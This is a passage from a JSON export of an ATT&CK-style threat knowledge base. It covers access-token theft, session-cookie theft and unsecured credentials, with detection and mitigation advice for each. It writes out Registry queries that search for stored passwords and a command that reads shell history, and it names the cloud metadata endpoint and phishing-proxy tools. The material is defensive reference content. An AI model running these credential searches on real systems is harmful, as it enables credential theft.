developers should consider taking measures to validate authentication requests by enabling one-time passwords, providing timestamps or sequence numbers for messages sent, using digital signatures, and/or using random session keys. <a href=\"https://www.comparitech.com/blog/information-security/what-is-a-replay-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Comparitech Replay Attack)</a> <a href=\"https://www.bugcrowd.com/glossary/replay-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bugcrowd Replay Attack)</a>"},{"id":"M1019","name":"Threat Intelligence Program","description":"Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization."},{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. <a href=\"https://arstechnica.com/information-technology/2017/03/hack-that-escapes-vm-by-exploiting-edge-browser-fetches-105000-at-pwn2own/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ars Technica Pwn2Own 2017 VM Escape)</a>"},{"id":"M1050","name":"Exploit Protection","description":"Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. <a href=\"https://blogs.technet.microsoft.com/srd/2017/08/09/moving-beyond-emet-ii-windows-defender-exploit-guard/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Moving Beyond EMET)</a> Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. <a href=\"https://en.wikipedia.org/wiki/Control-flow_integrity\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Control Flow Integrity)</a> Many of these protections depend on the architecture and target application binary for compatibility and may not work for software targeted for defense evasion."},{"id":"M1051","name":"Update Software","description":"Update software regularly by employing patch management for internal enterprise endpoints and servers."}],"subTechniques":[]},{"id":"T1528","name":"Steal Application Access Token","description":"Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS). <a href=\"https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)</a>  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.\n\nFor example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container’s token and thereby gain access to Kubernetes API commands. <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Service Accounts)</a>  \n\nSimilarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment. <a href=\"https://www.cidersecurity.io/top-10-cicd-security-risks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cider Security Top 10 CICD Security Risks)</a> If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges. \n\nIn Azure, an adversary who compromises a resource with an attached Managed Identity, such as an Azure VM, can request short-lived tokens through the Azure Instance Metadata Service (IMDS). These tokens can then facilitate unauthorized actions or further access to other Azure services, bypassing typical credential-based authentication. <a href=\"https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Entra Managed Identities 2025)</a> <a href=\"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a?gi=6a9daedade1c\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Managed Identity 2022)</a>\n\nToken theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow. <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-v2-protocols\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Identity Platform Protocols May 2019)</a> <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - OAuth Code Authorization flow - June 2019)</a> An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. <a href=\"https://www.amnesty.org/en/latest/research/2019/08/evolving-phishing-attacks-targeting-journalists-and-human-rights-defenders-from-the-middle-east-and-north-africa/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amnesty OAuth Phishing Attacks, August 2019)</a> <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Pawn Storm OAuth 2017)</a> The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls. <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/develop/quickstart-register-app\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Azure AD App Registration - May 2019)</a> Then, they can send a Spearphishing Link to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through Application Access Token. <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)</a>\n\nApplication access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens <a href=\"https://auth0.com/learn/refresh-tokens/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Auth0 Understanding Refresh Tokens)</a>, allowing them to obtain new access tokens without prompting the user.","detection":"Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a “High severity app permissions” policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.\n\nSecurity analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app’s purpose, or apps with old “Last authorized” fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.\n\nAdministrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.","platforms":["Containers","IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["Active Directory: Active Directory Object Modification","User Account: User Account Modification"],"mitigations":[{"id":"M1017","name":"User Training","description":"Users need to be trained to not authorize third-party applications they don’t recognize. The user should pay particular attention to the redirect URL: if the URL is a misspelled or convoluted sequence of words related to an expected service or SaaS application, the website is likely trying to spoof a legitimate service. Users should also be cautious about the permissions they are granting to apps. For example, offline access and access to read emails should excite higher suspicions because adversaries can utilize SaaS APIs to discover credentials and other sensitive communications."},{"id":"M1018","name":"User Account Management","description":"Enforce role-based access control to limit accounts to the least privileges they require. A Cloud Access Security Broker (CASB) can be used to set usage policies and manage user permissions on cloud applications to prevent access to application access tokens. In Kubernetes applications, set “automountServiceAccountToken: false” in the YAML specification of pods that do not require access to service account tokens. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a>"},{"id":"M1021","name":"Restrict Web-Based Content","description":"Administrators can block end-user consent to OAuth applications, disabling users from authorizing third-party apps through OAuth 2.0 and forcing administrative consent for all requests. They can also block end-user registration of applications by their users, to reduce risk. A Cloud Access Security Broker can also be used to ban applications.\n\nAzure offers a couple of enterprise policy settings in the Azure Management Portal that may help:\n\n\"Users -&gt; User settings -&gt; App registrations: Users can register applications\" can be set to \"no\" to prevent users from registering new applications. \n\"Enterprise applications -&gt; User settings -&gt; Enterprise applications: Users can consent to apps accessing company data on their behalf\" can be set to \"no\" to prevent users from consenting to allow third-party multi-tenant applications"},{"id":"M1047","name":"Audit","description":"Administrators should audit all cloud and container accounts to ensure that they are necessary and that the permissions granted to them are appropriate.  Additionally, administrators should perform an audit of all OAuth applications and the permissions they have been granted to access organizational data. This should be done extensively on all applications in order to establish a baseline, followed up on with periodic audits of new or updated applications. Suspicious applications should be investigated and removed."}],"subTechniques":[]},{"id":"T1539","name":"Steal Web Session Cookie","description":"An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols. <a href=\"https://wunderwuzzi23.github.io/blog/passthecookie.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pass The Cookie)</a>\n\nThere are several examples of malware targeting cookies from web browsers on the local system. <a href=\"https://securelist.com/project-tajmahal/90240/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky TajMahal April 2019)</a> <a href=\"https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Mac Crypto Cookies January 2019)</a> Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on User Execution by tricking victims into running malicious JavaScript in their browser. <a href=\"https://blog.talosintelligence.com/roblox-scam-overview/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Roblox Scam 2023)</a> <a href=\"https://krebsonsecurity.com/2023/05/discord-admins-hacked-by-malicious-bookmarks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Krebs Discord Bookmarks 2023)</a>\n\nThere are also open source frameworks such as <code>Evilginx2</code> and <code>Muraena</code> that can gather session cookies through a malicious proxy (e.g., Adversary-in-the-Middle) that can be set up by an adversary and used in phishing campaigns. <a href=\"https://github.com/kgretzky/evilginx2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github evilginx2)</a> <a href=\"https://github.com/muraenateam/muraena\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Mauraena)</a>\n\nAfter an adversary acquires a valid cookie, they can then perform a Web Session Cookie technique to login to the corresponding web application.","detection":"Monitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory.","platforms":["Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Process: Process Access","File: File Access"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to identify aspects of phishing attempts where they're asked to enter credentials into a site that has the incorrect domain for the application they are logging into. Additionally, train users not to run untrusted JavaScript in their browser, such as by copying and pasting code or dragging and dropping bookmarklets."},{"id":"M1021","name":"Restrict Web-Based Content","description":"Restrict or block web-based content that could be used to extract session cookies or credentials stored in browsers. Use browser security settings, such as disabling third-party cookies and restricting browser extensions, to limit the attack surface."},{"id":"M1032","name":"Multi-factor Authentication","description":"Deploy hardware-based token (e.g., YubiKey or FIDO key), which incorporates the target login domain as part of the negotiation protocol, will prevent session cookie theft through proxy methods.\n\nImplement Conditional Access policies to only allow logins from trusted devices, such as those enrolled in Intune or joined via Hybrid/Entra. This mitigates the risk of session cookie replay attacks by ensuring that stolen tokens cannot be reused on unauthorized devices."},{"id":"M1047","name":"Audit","description":"Implement auditing for authentication activities and user logins to detect the use of stolen session cookies. Monitor for impossible travel scenarios and anomalous behavior that could indicate the use of compromised session tokens or cookies."},{"id":"M1051","name":"Update Software","description":"Regularly update web browsers, password managers, and all related software to the latest versions. Keeping software up-to-date reduces the risk of vulnerabilities being exploited by attackers to extract stored credentials or session cookies."},{"id":"M1054","name":"Software Configuration","description":"Configure browsers or tasks to regularly delete persistent cookies.\n\nAdditionally, minimize the length of time a web cookie is viable to potentially reduce the impact of stolen cookies while also increasing the needed frequency of cookie theft attempts – providing defenders with additional chances at detection. <a href=\"https://www.microsoft.com/en-us/security/blog/2022/11/16/token-tactics-how-to-prevent-detect-and-respond-to-cloud-token-theft/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Token tactics)</a> For example, use non-persistent cookies to limit the duration a session ID will remain on the web client cache where an attacker could obtain it. <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Session Management Cheat Sheet)</a>"}],"subTechniques":[]},{"id":"T1552","name":"Unsecured Credentials","description":"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. Shell History), operating system or application-specific repositories (e.g. Credentials in Registry),  or other specialized files/artifacts (e.g. Private Keys). <a href=\"https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Brining MimiKatz to Unix)</a>","detection":"While detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See Valid Accounts for more information.\n\nMonitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and/or using command-line arguments  indicative of searching for credential material (ex: regex patterns). These may be indicators of automated/scripted credential access behavior.\n\nMonitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like <code>cat ~/.bash_history</code>.\n\nAdditionally, monitor processes for applications that can be used to query the Registry, such as Reg, and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.","platforms":["Windows","SaaS","IaaS","Linux","macOS","Containers","Network Devices","Office Suite","Identity Provider"],"dataSources":["Windows Registry: Windows Registry Key Access","Application Log: Application Log Content","Command: Command Execution","Process: Process Creation","File: File Access","User Account: User Account Authentication"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Remove vulnerable Group Policy Preferences. <a href=\"http://support.microsoft.com/kb/2962486\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft MS14-025)</a>"},{"id":"M1017","name":"User Training","description":"Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict file shares to specific directories with access only to necessary users."},{"id":"M1026","name":"Privileged Account Management","description":"If it is necessary that software must store credentials in the Registry, then ensure the associated accounts have limited permissions so they cannot be abused if obtained by an adversary."},{"id":"M1027","name":"Password Policies","description":"Use strong passphrases for private keys to make cracking difficult. Do not store credentials within the Registry. Establish an organizational policy that prohibits password storage in files."},{"id":"M1028","name":"Operating System Configuration","description":"There are multiple methods of preventing a user's command history from being flushed to their .bash_history file, including use of the following commands:\n<code>set +o history</code> and <code>set -o history</code> to start logging again;\n<code>unset HISTFILE</code> being added to a user's .bash_rc file; and\n<code>ln -s /dev/null ~/.bash_history</code> to write commands to <code>/dev/null</code>instead."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Limit network access to sensitive services, such as the Instance Metadata API."},{"id":"M1037","name":"Filter Network Traffic","description":"Limit access to the Instance Metadata API. A properly configured Web Application Firewall (WAF) may help prevent external adversaries from exploiting Server-side Request Forgery (SSRF) attacks that allow access to the Cloud Instance Metadata API. <a href=\"https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RedLock Instance Metadata API 2018)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"When possible, store keys on separate cryptographic hardware instead of on the local system."},{"id":"M1047","name":"Audit","description":"Preemptively search for files containing passwords or other credentials and take actions to reduce the exposure risk when found."},{"id":"M1051","name":"Update Software","description":"Apply patch KB2962486 which prevents credentials from being stored in GPPs. <a href=\"https://adsecurity.org/?p=2288\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Finding Passwords in SYSVOL)</a> <a href=\"https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MS14-025)</a>"}],"subTechniques":[{"id":"T1552.001","name":"Credentials In Files","description":"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping. <a href=\"http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CG 2014)</a> Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. <a href=\"http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SRD GPP)</a>\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. <a href=\"https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Hildegard Malware)</a> They may also be found as parameters to deployment commands in container logs. <a href=\"https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Unsecured Docker Daemons)</a> In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. <a href=\"https://posts.specterops.io/head-in-the-clouds-bd038bb69e48\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Specter Ops - Cloud Credential Storage)</a>","detection":"While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See Valid Accounts for more information.","platforms":["Containers","IaaS","Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","File: File Access"],"mitigations":[{"id":"M1017","name":"User Training","description":"Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict file shares to specific directories with access only to necessary users."},{"id":"M1027","name":"Password Policies","description":"Establish an organizational policy that prohibits password storage in files."},{"id":"M1047","name":"Audit","description":"Preemptively search for files containing passwords and take actions to reduce the exposure risk when found."}]},{"id":"T1552.002","name":"Credentials in Registry","description":"Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: <a href=\"https://pentestlab.blog/2017/04/19/stored-credentials/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pentestlab Stored Credentials)</a>\n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>","detection":"Monitor processes for applications that can be used to query the Registry, such as Reg, and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Windows Registry: Windows Registry Key Access"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"If it is necessary that software must store credentials in the Registry, then ensure the associated accounts have limited permissions so they cannot be abused if obtained by an adversary."},{"id":"M1027","name":"Password Policies","description":"Do not store credentials within the Registry."},{"id":"M1047","name":"Audit","description":"Proactively search for credentials within the Registry and attempt to remediate the risk."}]},{"id":"T1552.003","name":"Shell History","description":"Adversaries may search the command history on compromised systems for insecurely stored credentials.\n\nOn Linux and macOS systems, shells such as Bash and Zsh keep track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user's history file. For each user, this file resides at the same location: for example, <code>~/.bash_history</code> or <code>~/.zsh_history</code>. Typically, these files keeps track of the user's last 1000 commands.\n\nOn Windows, PowerShell has both a command history that is wiped after the session ends, and one that contains commands used in all sessions and is persistent. The default location for persistent history can be found in <code>%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt</code>, but command history can also be accessed with <code>Get-History</code>. Command Prompt (CMD) on Windows does not have persistent history. <a href=\"https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_history?view=powershell-7.5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft about_History)</a> <a href=\"https://michaelkoczwara.medium.com/windows-privilege-escalation-dbb908cce8d4\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium)</a>\n\nUsers often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. <a href=\"https://www.slideshare.net/slideshow/external-to-da-the-os-x-way/62021418\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: External to DA, the OS X Way)</a>","detection":"Monitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like <code>cat ~/.bash_history</code>.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Access","Command: Command Execution"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"There are multiple methods of preventing a user's command history from being flushed to their .bash_history file, including use of the following commands:\n<code>set +o history</code> and <code>set -o history</code> to start logging again;\n<code>unset HISTFILE</code> being added to a user's .bash_rc file; and\n<code>ln -s /dev/null ~/.bash_history</code> to write commands to <code>/dev/null</code> instead.\n\nIn Zsh, <code>fc -p</code> can be used to create a private history session. However, previous history will be unavailable to the user until the session ends. Using <code>unset HISTFILE</code> and writing commands to <code>/dev/null</code> can also be used, similarly to Bash.\n\nIn PowerShell, users can utilize <code>Set-PSReadLineOption</code> to modify how commands are saved into history. Setting <code>-HistorySaveStyle SaveNothing</code> prevents command history from being saved onto the file. Note that setting it from <code>SaveNothing</code> to <code>SaveIncrementally</code> in the same session will cause all commands from that session to be saved. Alternatively, <code>-AddToHistoryHandler</code> can be used to filter certain commands from being saved into the history file."}]},{"id":"T1552.004","name":"Private Keys","description":"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. <a href=\"https://en.wikipedia.org/wiki/Public-key_cryptography\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Public Key Crypto)</a> Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&amp;#92;Users&amp;#92;(username)&amp;#92;.ssh&amp;#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates. <a href=\"https://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Careto)</a> <a href=\"https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Prince of Persia)</a>\n\nWhen a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device’s identity. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Primary Refresh Token)</a> An adversary with access to the device may be able to export the keys in order to impersonate the device. <a href=\"https://aadinternals.com/post/deviceidentity/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals Azure AD Device Identities)</a>\n\nOn network devices, private keys may be exported via Network Device CLI commands such as <code>crypto pki export</code>. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/sec_conn_pki/configuration/xe-17/sec-pki-xe-17-book/sec-deploy-rsa-pki.html#GUID-1CB802D8-9DE3-447F-BECE-CF22F5E11436\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: cisco_deploy_rsa_keys)</a> \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.","detection":"Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication. For network infrastructure devices, collect AAA logging to monitor for private keys being exported.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Command: Command Execution","File: File Access"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure permissions are properly set on folders containing sensitive private keys to prevent unintended access. Additionally, on Cisco devices, set the <code>nonexportable</code> flag during RSA key pair generation. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/sec_conn_pki/configuration/xe-17/sec-pki-xe-17-book/sec-deploy-rsa-pki.html#GUID-1CB802D8-9DE3-447F-BECE-CF22F5E11436\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: cisco_deploy_rsa_keys)</a>"},{"id":"M1027","name":"Password Policies","description":"Use strong passphrases for private keys to make cracking difficult."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"When possible, store keys on separate cryptographic hardware instead of on the local system. For example, on Windows systems use a TPM to secure keys and other sensitive credential material. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Primary Refresh Token)</a>"},{"id":"M1047","name":"Audit","description":"Ensure only authorized keys are allowed access to critical resources and audit access lists regularly."}]},{"id":"T1552.005","name":"Cloud Instance Metadata API","description":"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance. <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Instance Metadata API)</a> A cloud metadata API has been used in at least one high profile compromise. <a href=\"https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Krebs Capital One August 2019)</a>\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API. <a href=\"https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RedLock Instance Metadata API 2018)</a>\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.","detection":"Monitor access to the Instance Metadata API and look for anomalous queries.\n\nIt may be possible to detect adversary use of credentials they have obtained such as in Valid Accounts.","platforms":["IaaS"],"dataSources":["User Account: User Account Authentication"],"mitigations":[{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Limit access to the Instance Metadata API using a host-based firewall such as iptables."},{"id":"M1037","name":"Filter Network Traffic","description":"Limit access to the Instance Metadata API. A properly configured Web Application Firewall (WAF) may help prevent external adversaries from exploiting Server-side Request Forgery (SSRF) attacks that allow access to the Cloud Instance Metadata API. <a href=\"https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RedLock Instance Metadata API 2018)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable unnecessary metadata services and restrict or disable insecure versions of metadata services that are in use to prevent adversary access. <a href=\"https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon AWS IMDS V2)</a>"}]},{"id":"T1552.006","name":"Group Policy Preferences","description":"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts. <a 